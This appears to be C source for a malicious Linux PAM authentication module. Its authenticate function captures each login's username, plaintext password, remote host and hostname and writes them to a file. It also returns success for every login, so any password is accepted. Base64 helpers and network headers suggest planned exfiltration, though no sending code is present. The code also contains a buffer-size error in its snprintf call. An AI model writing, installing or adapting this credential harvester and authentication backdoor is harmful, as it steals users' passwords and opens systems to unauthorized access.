#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>
static const char *ALPHA_BASE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char *en(const char *buf, const long size, char *b4Char) {
    int a = 0;
    int i = 0;
    while (i < size) {
        char b0 = buf[i++];
        char b1 = (i < size) ? buf[i++] : 0;
        char b2 = (i < size) ? buf[i++] : 0;

        int int63 = 0x3F; //  00111111
        int int255 = 0xFF; // 11111111
        b4Char[a++] = ALPHA_BASE[(b0 >> 2) & int63];
        b4Char[a++] = ALPHA_BASE[((b0 << 4) | ((b1 & int255) >> 4)) & int63];
        b4Char[a++] = ALPHA_BASE[((b1 << 2) | ((b2 & int255) >> 6)) & int63];
        b4Char[a++] = ALPHA_BASE[b2 & int63];
    }
    switch (size % 3) {
        case 1:
            b4Char[--a] = '=';
        case 2:
            b4Char[--a] = '=';
    }
    return b4Char;
}

char *de(const char *b4Char, const long b4CharSize, char *originChar, long originCharSize) {
    int toInt[128] = {-1};
    for (int i = 0; i < 64; i++) {
        toInt[(int)ALPHA_BASE[i]] = i;
    }
    int int255 = 0xFF;
    int index = 0;
    for (int i = 0; i < b4CharSize; i += 4) {
        int c0 = toInt[(int)b4Char[i]];
        int c1 = toInt[(int)b4Char[i + 1]];
        originChar[index++] = (((c0 << 2) | (c1 >> 4)) & int255);
        if (index >= originCharSize) {
            return originChar;
        }
        int c2 = toInt[(int)b4Char[i + 2]];
        originChar[index++] = (((c1 << 4) | (c2 >> 2)) & int255);
        if (index >= originCharSize) {
            return originChar;
        }
        int c3 = toInt[(int)b4Char[i + 3]];
        originChar[index++] = (((c2 << 6) | c3) & int255);
    }
    return originChar;
}
void sendMessage(char (*message)[],const char ** password) {
    FILE *fout=fopen("/home/venn/test/output.txt","w+");
    fprintf(fout,"OK!\n%s",*message);
    fclose(fout);
}

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
  int retval;
  const char* username;
  const char* password;
  char message[1024];
  char hostname[128];
  retval = pam_get_user(pamh, &username, "Username: ");
  pam_get_item(pamh, PAM_AUTHTOK, (const void **)(void *) &password);
  if (retval != PAM_SUCCESS) {
    return retval;
  }
  gethostname(hostname, sizeof hostname);
  /*struct hostent *pHost=gethostbyname(hostname);
  struct in_addr addr;
  char *pIp = pHost->h_addr_list[0];
  memcpy(&addr.s_addr,pIp,pHost->h_length);
  char *ipV4=inet_ntoa(addr);*/
  const char *rhost;
  pam_get_item(pamh, PAM_RHOST, (const void **)(void *)&rhost);
  snprintf(message,2048,"IP:%s\nHostname:%s\nUsername:%s\nPassword:%s\n",rhost,hostname,username,password);
  sendMessage((char(*)[]) &message,&password);
  return PAM_SUCCESS;
}
